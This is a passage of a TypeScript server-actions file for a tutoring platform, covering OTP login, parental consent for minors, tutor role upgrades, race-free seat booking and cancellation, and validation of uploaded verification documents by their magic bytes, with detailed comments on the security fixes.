"use server";
import { eq, and, or, ne, sql, desc, ilike, inArray, isNull } from "@tnajem/db";
import { db, dbReady } from "@/lib/db";
import {
  profiles, tutors, classes, packs, bookings, consents, verificationDocs, reviews, notifications,
} from "@tnajem/db";
import { writeFile, mkdir } from "node:fs/promises";
import { join } from "node:path";
import {
  normalizePhone, isValidPhone, createOtp, verifyOtpCode, otpCooldownRemaining,
  createSession, destroySession, getSession, setDemoCookie, checkRateLimit, clientIp,
  setRoleHint, otpChannel, normalizeEmail, isValidEmail,
  OTP_RESEND_COOLDOWN_SEC, OTP_TTL_SEC, adoptSession,} from "@/lib/auth";
import { demoClasses, demoEnabled } from "@/lib/demo";
import { revalidateTutor, revalidatePublicTutors } from "@/lib/cache";
import { smsEnabled, sendSms } from "@tnajem/shared/sms";
import { mailEnabled, sendMail } from "@tnajem/shared/mail";
import { notify } from "@/lib/notify";
import { requireAdmin, adminNotifyEmails } from "@/lib/admin";
import { call, callAnonymous } from "@/lib/api";
import { paymentsEnabled, tutorBalanceTnd } from "@tnajem/shared/payments";
import { liveRoomUrl, resolveMeetUrl } from "@tnajem/shared/live";
import {
  vText, vOptionalText, vInt, vPrice, vFutureDate, vOptionalUrl, vSlug, vRating, vPhone,
  vUuid, isUuid, safeFileName, vBirthYear, isMinorBirthYear, vOptionalPhone,
} from "@tnajem/shared";
import type {
  DashboardData, DashboardBooking, StudentDashboard, ClassItem, TutorVerification, PendingTutor,
  ExploreTutor, TutorReviews, NotificationItem, NotificationKind, DashboardResult,
  StudentLevel, Role, OnboardingState,
} from "@tnajem/shared";
import { STUDENT_LEVELS, parseStudentProfile } from "@tnajem/shared";
import type { Me } from "@tnajem/shared";

type DocKind = "id_front" | "id_back" | "selfie" | "diploma" | "certificate" | "role_proof" | "other";

/* Read once. Every "may we leak this to the client?" decision in this file keys off
   it, and a single named constant is easier to audit than scattered string compares. */
const IS_PROD = process.env.NODE_ENV === "production";

const DASH_MONTHS = ["JANV", "FÉVR", "MARS", "AVR", "MAI", "JUIN", "JUIL", "AOÛT", "SEPT", "OCT", "NOV", "DÉC"];
const CANCEL_WINDOW_MS = 24 * 60 * 60 * 1000; // the UI promises free cancellation up to 24h before

/* Server actions = the write/auth path. Callable from client components.
   In demo mode (no DATABASE_URL) they degrade gracefully so the UI still works.
   Every input goes through lib/validation.ts — actions are a public surface. */

export type ActionResult = { ok: boolean; demo?: boolean; slug?: string; error?: string };

/* Display name for public surfaces: "Amine Karoui" → "Amine K." (never the phone). */
function publicName(full: string | null): string | null {
  if (!full) return null;
  const parts = full.trim().split(/\s+/);
  if (parts.length < 2) return parts[0] ?? null;
  return `${parts[0]} ${parts[parts.length - 1][0].toUpperCase()}.`;
}
const initials = (name: string) => {
  const p = name.trim().split(/\s+/);
  return ((p[0]?.[0] ?? "") + (p.length > 1 ? p[p.length - 1][0] : "")).toUpperCase() || "?";
};

/* Recompute a tutor's public stats from real rows — never a fabricated number.
   rating = average of their reviews (0 if none); students = distinct students
   holding a live (non-cancelled) booking on one of their classes.

   RACE (fixed): this used to SELECT the aggregates, then UPDATE with the values it
   had read. Two students reviewing the same tutor at the same moment both read the
   pre-insert average and both wrote it back, so one review silently vanished from
   the public rating (lost update). Same shape for students_count.

   Fix: one statement. The aggregates are computed as correlated subqueries INSIDE
   the UPDATE, so Postgres evaluates them against the row's state at write time and
   concurrent writers serialize on the tutor row instead of clobbering each other.
   No read-then-write window left to lose.

   `tx` lets callers run this inside a transaction (reserveSeat / cancelBooking /
   createReview all do). Structurally typed on `update` alone so the same function
   accepts both the plain db handle and a drizzle transaction handle. */
type Updater = Pick<typeof db, "update">;

async function recomputeTutorStats(tutorId: string, tx: Updater = db): Promise<void> {
  await tx
    .update(tutors)
    .set({
      rating: sql`coalesce((
        select round(avg(${reviews.rating})::numeric, 1)
        from ${reviews} where ${reviews.tutorId} = ${tutorId}
      ), 0)`,
      studentsCount: sql`(
        select count(distinct ${bookings.studentId})::int
        from ${bookings}
        join ${classes} on ${bookings.classId} = ${classes.id}
        where ${classes.tutorId} = ${tutorId} and ${bookings.status} <> 'cancelled'
      )`,
    })
    .where(eq(tutors.id, tutorId));
}

/* ---------- Auth (OTP) ----------

   THE CODE GOES TO AN EMAIL ADDRESS. It used to be an SMS, and the SMS path is
   still right here, live and compiling, behind otpChannel() — set OTP_CHANNEL=sms
   and phone login is back with no code change. It is not commented out on purpose:
   commented code is invisible to tsc and to the audit gates, so it silently rots.

   WHY WE MOVED: every SMS costs money, and reliable delivery to Tunisian numbers
   needs a registered alphanumeric sender ID. Until that exists smsEnabled() is
   false and this action only ever returns the code on-screen in dev — meaning a
   real deploy had no working login at all. */

/* The email itself. Kept next to the SMS wording it replaces, and localised:
   sending a French email to someone using the Arabic site is a small betrayal of
   the only bilingual promise the product makes. Plain text — a six-digit code
   needs no layout, and text-only bodies are the least likely to be held back by a
   spam filter, which for an OTP is the whole product. */
/* OTP_MAIL moved to apps/api/src/lib/otp-copy.ts with the sender. */

/* `resendAfter` / `expiresIn` (seconds) travel with every successful send so the
   login screens can count down the cooldown and the code's life WITHOUT keeping
   their own copy of either constant — see the note on them in lib/auth.ts. */
export async function requestOtp(input: { identifier: string; locale?: string }):
  Promise<{
    ok: boolean; devCode?: string; demo?: boolean; error?: string; retryAfter?: number;
    resendAfter?: number; expiresIn?: number;
  }> {
  if (!dbReady) {
    /* Demo mode (no DATABASE_URL) — the UI-audit harness and local preview. The
       sentinel code is still withheld in production: a prod deploy that lost its
       DATABASE_URL must degrade to "can't sign in", never to "sign in as anyone".
       Kept on the WEB side because it exists to keep `next build` and the audit
       harness working without a database; apps/api asserts DATABASE_URL at boot. */
    return IS_PROD
      ? { ok: false, error: "send-failed" }
      : { ok: true, demo: true, devCode: "000000", resendAfter: OTP_RESEND_COOLDOWN_SEC, expiresIn: OTP_TTL_SEC };
  }
  // PORTED to apps/api (POST /auth/otp/request). Rate limits, the advisory-locked
  // mint and delivery all live there now.
  return call("/auth/otp/request", input);
}

export async function verifyOtp(input: { identifier: string; code: string; role?: "tutor" | "student"; locale?: string; birthYear?: number }):
  Promise<{ ok: boolean; role?: string; needsConsent?: boolean; created?: boolean; roleMismatch?: boolean; needsProfile?: boolean; hasStorefront?: boolean; error?: string; retryAfter?: number }> {
  if (!dbReady) {
    setDemoCookie(input.role === "tutor" ? "tutor" : "student");
    const demoRole = input.role ?? "student";
    // Demo mode mirrors the real gate: a student is a minor unless they gave an
    // adult birth year, in which case consent is skipped.
    const demoMinor = input.role === "student" && isMinorBirthYear(vBirthYear(input.birthYear));
    // Demo has no stored profile, so every run looks like a fresh signup that still
    // needs the welcome screen — which is exactly what we want to be able to audit.
    return {
      ok: true, role: demoRole, needsConsent: demoMinor,
      created: true, roleMismatch: false, needsProfile: demoRole === "student",
    };
  }

  /* PORTED to apps/api (POST /auth/otp/verify). Everything that decides identity
     — normalisation, the two throttles, code verification, profile creation, the
     consent gate — runs there.

     The COOKIES stay here, and must. apps/api is talking to this server, not to
     the browser, so it returns the token it minted and we write it. The role hint
     is web-only by design: it is a forgeable UI hint that decides one nav link,
     and the API has no business knowing it exists. */
  const res = await call<{
    ok: boolean; role?: string; needsConsent?: boolean; created?: boolean;
    roleMismatch?: boolean; needsProfile?: boolean; hasStorefront?: boolean;
    error?: string; retryAfter?: number;
    session?: { token: string; expiresAt: string };
  }>("/auth/otp/verify", input);

  if (res.ok && res.session) {
    adoptSession(res.session.token, new Date(res.session.expiresAt), res.role);
  }
  const { session: _session, ...rest } = res;
  return rest;
}

export async function logout(): Promise<{ ok: boolean }> {
  /* The API deletes the row; this clears the cookies. Both halves matter: a
     cleared cookie with a live row means anyone holding the token is still signed
     in, and a deleted row with a live cookie means the browser keeps sending a
     token that no longer resolves. destroySession() does the cookie half. */
  if (dbReady) {
    try {
      await call("/auth/logout");
    } catch {
      /* An API outage must not strand someone signed in on this browser. Clearing
         the cookie is the half we can always do; the row expires on its own and
         is swept by the purge. */
    }
  }
  await destroySession();
  return { ok: true };
}

export async function saveConsent(input: { guardianName: string; guardianPhone: string }): Promise<ActionResult> {
  if (!dbReady) return { ok: true, demo: true };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };

  // This row is the legal record of parental consent (INPDP) — it must be real data.
  const name = vText(input.guardianName, { field: "guardian-name", max: 120, min: 2 });
  if (!name.ok) return { ok: false, error: name.error };
  const phone = vPhone(input.guardianPhone);
  if (!phone.ok) return { ok: false, error: phone.error };
  const normalized = normalizePhone(phone.value);
  if (!isValidPhone(normalized)) return { ok: false, error: "invalid-phone" };

  // `consents` has no unique key on minor_id, and this action had no dedupe — so a
  // client could POST it in a loop and write unbounded rows against one profile
  // (storage burn, and a legal record that no longer has a single answer for
  // "who consented?"). One consent per minor: re-submitting updates it in place.
  const [existing] = await db.select().from(consents)
    .where(eq(consents.minorId, session.profile.id)).limit(1);

  const values = {
    guardianName: name.value,
    guardianPhone: normalized,
    consentText: "Consentement du parent/tuteur pour un compte de moins de 18 ans (INPDP).",
  };

  if (existing) {
    await db.update(consents).set(values).where(eq(consents.id, existing.id));
  } else {
    await db.insert(consents).values({ minorId: session.profile.id, ...values });
  }
  return { ok: true };
}

/* ---------- Role: the one and only student → tutor upgrade ----------

   This is the ONLY place in the codebase that writes `profiles.role = 'tutor'`
   after signup. createTutor() used to do it as a side effect of saving a name; see
   the ROLE GATE comment there for why that was the whole problem.

   Three things it insists on, in order:

     1. AN EXPLICIT CONFIRMATION. `confirm` is not ceremony — it is the difference
        between a role change the user asked for and one that happened to them. The
        /onboarding/upgrade screen is what sets it.

     2. THE CURRENT ROLE IS `student`. A tutor calling this is a no-op success
        (idempotent, so a double-submit or a stale tab cannot fail); anything else
        is refused rather than coerced.

     3. THE USER IS AN ADULT. A tutor is ID-verified and then teaches children, so a
        minor must never hold the role. Age is only ever known for students (we
        collect a birth year at student signup and nowhere else), and it fails safe:
        an unknown age is NOT waved through — the caller is asked for it and it is
        persisted here. isMinorBirthYear treats null as minor, so the refusal below
        catches both "too young" and "still unknown after we asked".

   Role changes must also refresh ROLE_HINT_COOKIE or <SiteHeader> renders the old
   role for the rest of the session's 30 days — hence setRoleHint(). */
export async function becomeTutor(input: { confirm: boolean; birthYear?: number }): Promise<ActionResult> {
  if (!input?.confirm) return { ok: false, error: "not-confirmed" };

  if (!dbReady) {
    setDemoCookie("tutor"); // demo has no profile row; the cookie IS the state
    return { ok: true, demo: true };
  }

  /* PORTED to apps/api (POST /profile/become-tutor). The rate limit, the age rule
     and the role write all live there.

     setRoleHint stays HERE: it writes a cookie on the browser, which the API
     cannot do, and it is a forgeable UI hint the API has no business knowing
     about. The endpoint returns the new role so we know when to set it. */
  const res = await call<ActionResult & { role?: string }>("/profile/become-tutor", input);
  if (res.ok && res.role) setRoleHint(res.role);
  return { ok: res.ok, error: res.error };
}

export async function saveStudentProfile(
  input: { fullName: string; level?: string | null; subjects?: string[]; phone?: string | null },
): Promise<ActionResult> {
  /* Validation runs BEFORE the demo short-circuit, exactly as it always has, so
     the ui-audit harness can exercise the error states with no database. It uses
     parseStudentProfile from @tnajem/shared — the SAME function the API handler
     calls, not a copy. */
  if (!dbReady) {
    const check = parseStudentProfile(input);
    return check.ok ? { ok: true, demo: true } : { ok: false, error: check.error };
  }
  // PORTED to apps/api (POST /profile/student).
  return call<ActionResult>("/profile/student", input);
}

export async function getMe(): Promise<Me | null> {
  return call<Me | null>("/me", undefined, "GET");
}

/* ---------- Tutor storefront (bound to the signed-in user) ---------- */
export async function createTutor(input: { name: string; subject: string; bio: string; slug: string; phone?: string | null }): Promise<ActionResult> {
  if (!dbReady) {
    /* Demo mode still validates the slug so the audit harness can exercise the
       reserved/taken states. vSlug is the same function the API calls. */
    const slug = vSlug(input.slug);
    return slug.ok ? { ok: true, demo: true, slug: slug.value } : { ok: false, error: slug.error };
  }
  /* PORTED to apps/api (POST /tutors). The role gate, the WRITE-ONCE slug rule and
     the collision check all live there.

     call() replays the `revalidate` envelope the endpoint returns — revalidateTag
     only works inside a Next request scope, so cache busting cannot move to the
     API. See apps/web/lib/api.ts rule 4. */
  return call<ActionResult>("/tutors", input);
}

export async function getOnboardingState(): Promise<OnboardingState | null> {
  if (!dbReady) return null;
  // PORTED to apps/api (GET /profile/onboarding).
  return call<OnboardingState | null>("/profile/onboarding", undefined, "GET");
}

export async function createClass(input: {
  title: string; description?: string; scheduledAt: string;
  durationMin: number; priceTnd: number; seats: number; isFreeFirst: boolean;
  meetUrl?: string; whiteboardUrl?: string; quizUrl?: string;
}): Promise<ActionResult> {
  if (!dbReady) return { ok: true, demo: true };
  /* PORTED to apps/api (POST /classes). The validators, the verification gate and
     the insert all live there; call() replays the revalidate envelope. */
  return call<ActionResult>("/classes", input);
}

export async function createPack(input: { title: string; meta?: string; priceTnd: number }): Promise<ActionResult> {
  if (!dbReady) return { ok: true, demo: true };
  // PORTED to apps/api (POST /packs).
  return call<ActionResult>("/packs", input);
}

/* ---------- Dashboard (real data for the signed-in tutor) ----------
   Returns null in demo mode or when signed out → the dashboard then shows
   its demo preview. Otherwise returns the tutor's real storefront + classes. */
export async function getDashboard(): Promise<DashboardResult> {
  if (!dbReady) return null;
  // PORTED to apps/api (GET /dashboard).
  return call<DashboardResult>("/dashboard", undefined, "GET");
}

/* ---------- Booking (student reserves a seat — free first session) ----------
   Payment-free for the pilot: reserves a seat and decrements availability.
   Idempotent — re-booking the same class returns { already: true }. */
export async function reserveSeat(input: { classId: string }):
  Promise<{ ok: boolean; demo?: boolean; already?: boolean; error?: string }> {
  if (!dbReady) return { ok: true, demo: true };
  const classId = vUuid(input.classId, { field: "class" });
  if (!classId.ok) return { ok: false, error: "not-found" };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };
  const uid = session.profile.id;

  // Booking is a DB-write endpoint anyone with a session can hammer.
  const rl = await checkRateLimit(`book:${uid}`, 20, 60_000);
  if (!rl.ok) return { ok: false, error: "too-many-requests" };

  /* ---- GUARDIAN CONSENT (INPDP / Loi 2004-63) ----
     This was a promise, not a control. verifyOtp() returns `needsConsent` for a
     student with no `consents` row and the client sends them to /auth/consent,
     where saveConsent() records the guardian's name + phone — but NOTHING on the
     server ever checked that the row exists again. A student who closed that page,
     hit Back, or simply navigated straight to /checkout?class=<id> booked a seat
     with a real tutor and no consent on file. /privacy and the consent screen both
     tell users this consent is required before a minor uses the service, so the
     gap was: the legal record we publicly commit to collecting was optional in
     practice, and the only surface that could have enforced it — the booking, the
     moment the minor actually engages a tutor — didn't look.

     It looks now. Distinct error code so the UI can route to /auth/consent instead
     of showing "réessaie" for something retrying will never fix.

     Scoped to a MINOR student: consent is the guardian regime for under-18s, so an
     adult student (a real birth year that makes them >= 18) books without it, while
     a minor — or a student whose age we don't know (null birth year fails safe) —
     must have a consent row. `consents.minor_id` is only ever written for a student
     profile (saveConsent + verifyOtp); a tutor booking another tutor's class is not
     the minor this regime protects. Founder decision 2026-07-12: collect birth year
     at signup, gate consent under-18. */
  if (session.profile.role === "student" && isMinorBirthYear(session.profile.birthYear)) {
    const [consent] = await db
      .select({ id: consents.id })
      .from(consents)
      .where(eq(consents.minorId, uid))
      .limit(1);
    if (!consent) return { ok: false, error: "needs-consent" };
  }

  const [cls] = await db.select().from(classes).where(eq(classes.id, classId.value)).limit(1);
  if (!cls) return { ok: false, error: "not-found" };
  if (cls.status === "cancelled" || cls.status === "done") return { ok: false, error: "unavailable" };
  // A class in the past cannot be booked (there was no check at all — you could
  // reserve a seat in last month's session and then review it, see createReview).
  if (new Date(cls.scheduledAt).getTime() < Date.now()) return { ok: false, error: "unavailable" };

  /* The tutor must actually be verified. getStorefront() and getExploreTutors()
     both hide non-verified tutors, but NOTHING stopped a draft/pending/REJECTED
     tutor from handing out a direct /class/<id> link and taking real bookings from
     minors — the id is all you needed. The verification gate has to live on the
     booking path, not only on the discovery path. */
  const [tut] = await db.select().from(tutors).where(eq(tutors.id, cls.tutorId)).limit(1);
  if (!tut || tut.status !== "verified") return { ok: false, error: "unavailable" };
  if (tut.profileId === uid) return { ok: false, error: "own-class" }; // no self-booking

  /* ---- Atomic seat claim ----
     BEFORE: read seats_taken → compare to seats → UPDATE seats_taken = seats_taken + 1.
     Two students hitting "Réserver" on the last seat both read seats_taken = 19 of
     20, both passed the check, and both incremented → 21 bookings on a 20-seat
     class. Classic TOCTOU; on a "1ère séance gratuite" launch with a popular tutor
     this fires on day one.

     AFTER: the availability test IS the UPDATE's WHERE clause, evaluated by
     Postgres under a row lock. The loser's UPDATE matches zero rows and it gets
     "full" instead of a phantom seat. Booking insert + seat claim + tutor stats all
     ride one transaction, so a failure anywhere (e.g. the unique(class,student)
     constraint firing on a double-submit) rolls back the seat too — no leaked seats. */
  /* The transaction RETURNS the outcome rather than assigning to a captured
     variable. TypeScript's control-flow analysis does not track assignments made
     inside a callback (it cannot know the callback ran), so a captured
     `let outcome = "full"` stays narrowed to the literal "full" afterwards and
     every later comparison is a compile error. Returning the value keeps the
     type honest — and is clearer anyway. */
  type SeatOutcome = "booked" | "already" | "full";
  let outcome: SeatOutcome;
  try {
    outcome = await db.transaction(async (tx): Promise<SeatOutcome> => {
      const [existing] = await tx.select().from(bookings)
        .where(and(eq(bookings.classId, classId.value), eq(bookings.studentId, uid))).limit(1);
      if (existing && existing.status !== "cancelled") return "already";

      const claimed = await tx.update(classes)
        .set({ seatsTaken: sql`coalesce(${classes.seatsTaken}, 0) + 1` })
        .where(and(
          eq(classes.id, classId.value),
          sql`coalesce(${classes.seatsTaken}, 0) < coalesce(${classes.seats}, 0)`,
        ))
        .returning({ id: classes.id });
      if (claimed.length === 0) return "full"; // sold out — nobody oversells

      if (existing) {
        await tx.update(bookings).set({ status: "reserved" }).where(eq(bookings.id, existing.id));
      } else {
        await tx.insert(bookings).values({
          classId: classId.value, studentId: uid,
          isFree: Boolean(cls.isFreeFirst), status: "reserved",
        });
      }

      // students_count used to be a blind +1 per booking, so ONE student booking
      // three classes advertised the tutor as having three students. Recompute the
      // real distinct count instead (single statement, inside the tx).
      await recomputeTutorStats(cls.tutorId, tx);
      return "booked";
    });
  } catch {
    // unique(class_id, student_id) → a concurrent double-submit from the same
    // student. The tx rolled back, so the seat was NOT consumed. Idempotent success.
    return { ok: true, already: true };
  }

  if (outcome === "already") return { ok: true, already: true };
  if (outcome === "full") return { ok: false, error: "full" };

  /* seats_left just moved, and the storefront caches it for 60s — a class the
     cache still shows as "3 places" is how you get a student to the checkout of a
     sold-out session. Bust it. Outside the transaction (it commits above) and
     before the SMS: revalidateTutor() is a synchronous, non-throwing local call,
     unlike notify(). */
  revalidateTutor(tut.slug);

  // Tell both sides — AFTER the commit. notify() never throws, and it does SMS I/O:
  // running it inside the transaction would hold the seat lock open on the network
  // (a Twilio round-trip would pin one of the 10 pool connections — see lib/db/index.ts).
  const when = new Date(cls.scheduledAt);
  const whenLabel = when.toLocaleString("fr-FR", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" });

  await notify(uid, {
    kind: "booking_confirmed",
    title: "Place réservée ✅",
    body: `${cls.title} — ${whenLabel}${tut ? ` avec ${tut.fullName}` : ""}.`,
    href: `/class/${cls.id}`,
    sms: `Tnajem : ta place pour « ${cls.title} » le ${whenLabel} est réservée. Lien de la séance dans ton espace élève.`,
  });
  if (tut?.profileId) {
    await notify(tut.profileId, {
      kind: "new_booking",
      title: "Nouvelle réservation 🎉",
      body: `${session.profile.fullName ?? "Un élève"} a réservé « ${cls.title} » (${whenLabel}).`,
      href: "/dashboard",
    });
  }
  return { ok: true };
}

/* ---------- Cancellation (student) ----------
   The UI promises "annulation gratuite jusqu'à 24h avant" — enforce it here, not
   just in copy. Frees the seat back up and tells the tutor. */
export async function cancelBooking(input: { bookingId: string }): Promise<ActionResult> {
  if (!dbReady) return { ok: true, demo: true };
  const bookingId = vUuid(input.bookingId, { field: "booking" });
  if (!bookingId.ok) return { ok: false, error: "not-found" };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };
  const uid = session.profile.id;

  const [bk] = await db.select().from(bookings).where(eq(bookings.id, bookingId.value)).limit(1);
  if (!bk) return { ok: false, error: "not-found" };
  // IDOR guard: the booking must be the caller's own. (Held — verified, not changed.)
  if (bk.studentId !== uid) return { ok: false, error: "forbidden" };
  if (bk.status === "cancelled") return { ok: true }; // idempotent fast path

  const [cls] = await db.select().from(classes).where(eq(classes.id, bk.classId)).limit(1);
  if (!cls) return { ok: false, error: "not-found" };

  const startsInMs = new Date(cls.scheduledAt).getTime() - Date.now();
  if (startsInMs < CANCEL_WINDOW_MS) return { ok: false, error: "too-late" };

  /* ---- Atomic seat release ----
     BEFORE: the "already cancelled?" check was a plain read, then three blind
     UPDATEs. Two concurrent cancels of the SAME booking both saw status='reserved',
     both ran the decrement, and the class gave back TWO seats for one departure —
     which oversells the class exactly like the reserveSeat race did (greatest(…,0)
     only stops the counter going negative; it does not stop it going too low).

     AFTER: the status flip is the guard. `WHERE id = ? AND status <> 'cancelled'`
     with RETURNING means only ONE writer ever gets a row back, and only that writer
     releases the seat. The second cancel matches nothing and no-ops. */
  let released = false;
  await db.transaction(async (tx) => {
    const done = await tx
      .update(bookings)
      .set({ status: "cancelled" })
      .where(and(
        eq(bookings.id, bk.id),
        sql`coalesce(${bookings.status}, 'reserved') <> 'cancelled'`,
      ))
      .returning({ id: bookings.id });
    if (done.length === 0) return; // lost the race — the other writer freed the seat

    await tx
      .update(classes)
      .set({ seatsTaken: sql`greatest(coalesce(${classes.seatsTaken}, 0) - 1, 0)` })
      .where(eq(classes.id, cls.id));
    // Distinct-student recount (not a blind -1, which under-counted a student who
    // still holds other bookings with this tutor).
    await recomputeTutorStats(cls.tutorId, tx);
    released = true;
  });

  if (!released) return { ok: true }; // idempotent: someone already cancelled it

  const [tut] = await db.select().from(tutors).where(eq(tutors.id, cls.tutorId)).limit(1);
  // The seat is back on sale — the cached storefront must stop saying it isn't.
  revalidateTutor(tut?.slug);

  if (tut?.profileId) {
    const whenLabel = new Date(cls.scheduledAt)
      .toLocaleString("fr-FR", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit" });
    await notify(tut.profileId, {
      kind: "booking_cancelled",
      title: "Annulation",
      body: `${session.profile.fullName ?? "Un élève"} a annulé sa place pour « ${cls.title} » (${whenLabel}). La place est de nouveau libre.`,
      href: "/dashboard",
    });
  }
  return { ok: true };
}

/* ---------- Student dashboard (real reservations) ----------
   Returns null in demo mode / signed out → the student page shows demo data. */
export async function getStudentDashboard(): Promise<StudentDashboard | null> {
  if (!dbReady) return null;
  const session = await getSession();
  if (!session) return null;
  const uid = session.profile.id;

  const rows = await db
    .select({
      bookingId: bookings.id,
      isFree: bookings.isFree,
      classId: classes.id,
      title: classes.title,
      scheduledAt: classes.scheduledAt,
      status: classes.status,
      meetUrl: classes.meetUrl,
      replayUrl: classes.replayUrl,
      tutorName: tutors.fullName,
    })
    .from(bookings)
    .innerJoin(classes, eq(bookings.classId, classes.id))
    .innerJoin(tutors, eq(classes.tutorId, tutors.id))
    // Cancelled reservations disappear from the student's list (the seat is back on sale).
    .where(and(eq(bookings.studentId, uid), ne(bookings.status, "cancelled")))
    .orderBy(desc(classes.scheduledAt))
    .limit(300); // one join, bounded — no per-booking query

  const items = rows.map((r) => {
    const d = new Date(r.scheduledAt);
    return {
      bookingId: r.bookingId,
      classId: r.classId,
      title: r.title,
      tutorName: r.tutorName,
      day: String(d.getDate()),
      month: DASH_MONTHS[d.getMonth()] ?? "",
      time: d.toLocaleTimeString("fr-FR", { hour: "2-digit", minute: "2-digit" }),
      ts: d.getTime(),
      isFree: Boolean(r.isFree),
      status: r.status ?? "scheduled",
      // Never blank: falls back to the room derived from the class id (lib/live.ts).
      meetUrl: resolveMeetUrl({ id: r.classId, meetUrl: r.meetUrl }),
      replayUrl: r.replayUrl ?? undefined,
    };
  });

  const cutoff = Date.now() - 2 * 60 * 60 * 1000; // keep a class "upcoming" ~2h past start
  const upcoming = items.filter((i) => i.ts >= cutoff).sort((a, b) => a.ts - b.ts);
  const past = items.filter((i) => i.ts < cutoff).sort((a, b) => b.ts - a.ts);
  return { upcoming, past };
}

/* ---------- Single class read (for class detail / checkout / live) ----------
   Demo mode → demo class; real mode → the row by id, or null if missing. */
export async function getClass(id: string): Promise<ClassItem | null> {
  if (!dbReady) return demoEnabled ? (demoClasses.find((c) => c.id === id) ?? null) : null;
  /* PORTED to apps/api (GET /classes/:id).

     call(), not callAnonymous: the entitlement check needs the session — meet_url
     ships ONLY to the owning tutor or a student with a live booking, and it is the
     only thing protecting a live room full of minors.

     This is safe to make session-dependent because getClass is invoked from CLIENT
     components only. If anyone ever renders it from a server component on a cached
     route, the entitlement decision gets baked into cached HTML. That invariant is
     currently held by convention; e2e asserts the anonymous case. */
  return call<ClassItem | null>(`/classes/${encodeURIComponent(id)}`, undefined, "GET");
}

/* ===================== Tutor verification =====================
   Identity (ID) is required; diploma/experience/links are optional trust
   boosters. On submit the tutor goes to "pending" (hidden from Explore +
   public storefront) until an admin approves. Files are stored on local disk
   under ./.storage (gitignored) — swap for a cloud bucket in production. */

// STORAGE_DIR points at a persistent volume in prod (e.g. /var/data on Render);
// falls back to a local ./.storage folder in dev.
const STORAGE_BASE = process.env.STORAGE_DIR || join(process.cwd(), ".storage");
const STORAGE_ROOT = join(STORAGE_BASE, "verification");
const MAX_DOC_BYTES = 8 * 1024 * 1024; // 8 MB per file
const OK_MIME = /^(image\/(jpeg|png|webp|heic|heif)|application\/pdf)$/;
const DOC_FIELDS: { field: string; kind: DocKind; required?: boolean }[] = [
  { field: "idFront", kind: "id_front", required: true },
  { field: "idBack", kind: "id_back" },
  { field: "selfie", kind: "selfie" },
  { field: "diploma", kind: "diploma" },
  { field: "certificate", kind: "certificate" },
  { field: "roleProof", kind: "role_proof" },
];
const MAX_DOCS_PER_TUTOR = 24; // ~4 rounds of the 6 fields — a resubmit budget, not a bucket

/* Content sniffing. `File.type` is just the Content-Type the CLIENT put in the
   multipart part — it is attacker-chosen and proves nothing. The OK_MIME check
   above therefore only ever established what the uploader CLAIMED. Since the admin
   doc route streams these bytes back with that same claimed type, "HTML file
   labelled image/png" was a stored-XSS payload aimed at the one session that can
   read every tutor's national ID scan.

   So: verify the magic bytes. If the header doesn't match a format we accept, the
   upload is refused — regardless of what the client called it. Cheap, dependency-free,
   and it also stops polyglots from being written to disk in the first place. */
function sniffMime(buf: Buffer): string | null {
  if (buf.length < 12) return null;
  // JPEG: FF D8 FF
  if (buf[0] === 0xff && buf[1] === 0xd8 && buf[2] === 0xff) return "image/jpeg";
  // PNG: 89 50 4E 47 0D 0A 1A 0A
  if (buf.subarray(0, 8).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]))) return "image/png";
  // PDF: %PDF-
  if (buf.subarray(0, 5).toString("latin1") === "%PDF-") return "application/pdf";
  // RIFF....WEBP
  if (buf.subarray(0, 4).toString("latin1") === "RIFF" && buf.subarray(8, 12).toString("latin1") === "WEBP") {
    return "image/webp";
  }
  // ISO-BMFF (HEIC/HEIF): bytes 4..8 = "ftyp", brand at 8..12
  if (buf.subarray(4, 8).toString("latin1") === "ftyp") {
    const brand = buf.subarray(8, 12).toString("latin1");
    if (["heic", "heix", "hevc", "heim", "heis", "hevm", "mif1", "msf1"].includes(brand)) return "image/heic";
  }
  return null;
}

/* The admin gate lives in lib/admin.ts now — ONE implementation, shared with
   app/api/admin/doc/[id]/route.ts. That route carried a phone-only copy, so
   under email login (the default) every admin got 403 on every ID scan while
   still being shown the queue. The fail-closed history is documented there. */

export async function submitVerification(formData: FormData):
  Promise<{ ok: boolean; demo?: boolean; error?: string; retryAfter?: number }> {
  if (!dbReady) return { ok: true, demo: true };
  const session = await getSession();
  if (!session) return { ok: false, error: "not-authenticated" };
  const [mine] = await db.select().from(tutors).where(eq(tutors.profileId, session.profile.id)).limit(1);
  if (!mine) return { ok: false, error: "no-storefront" };

  /* Throttle. Each call can write up to 6 × 8 MB and there was NO limit on how
     often you could call it: a signed-in tutor could loop this and fill the disk
     (the same volume the app and every other tutor's documents live on). */
  const rl = await checkRateLimit(`verif:${mine.id}`, 5, 60 * 60_000); // 5 submissions / hour / tutor
  if (!rl.ok) return { ok: false, error: "too-many-requests", retryAfter: rl.retryAfter };

  /* Hard cap on stored documents per tutor. Rate limiting bounds the RATE; this
     bounds the TOTAL, so a patient attacker can't drip-feed the disk full over days.
     Rows are only ever removed by the retention purge (lib/retention.ts). */
  const [{ n: docCount } = { n: 0 }] = await db
    .select({ n: sql<number>`count(*)::int` })
    .from(verificationDocs)
    .where(eq(verificationDocs.tutorId, mine.id));

  // Collect + validate files (idFront required).
  const incoming: { kind: DocKind; file: File; bytes: Buffer; mime: string }[] = [];
  for (const d of DOC_FIELDS) {
    const f = formData.get(d.field);
    if (f instanceof File && f.size > 0) {
      // Size is checked BEFORE we read the body into memory.
      if (f.size > MAX_DOC_BYTES) return { ok: false, error: "file-too-large" };
      if (!OK_MIME.test(f.type)) return { ok: false, error: "bad-file-type" };

      const bytes = Buffer.from(await f.arrayBuffer());
      // Belt and braces: a lying Content-Length can't smuggle a bigger body past us.
      if (bytes.length > MAX_DOC_BYTES) return { ok: false, error: "file-too-large" };

      // The real gate: what the bytes ACTUALLY are, not what the client claimed.
      const sniffed = sniffMime(bytes);
      if (!sniffed || !OK_MIME.test(sniffed)) return { ok: false, error: "bad-file-type" };

      incoming.push({ kind: d.kind, file: f, bytes, mime: sniffed });
    } else if (d.required) {
      return { ok: false, error: "id-required" };
    }
  }

  if (docCount + incoming.length > MAX_DOCS_PER_TUTOR) {
    return { ok: false, error: "too-many-documents" };
  }

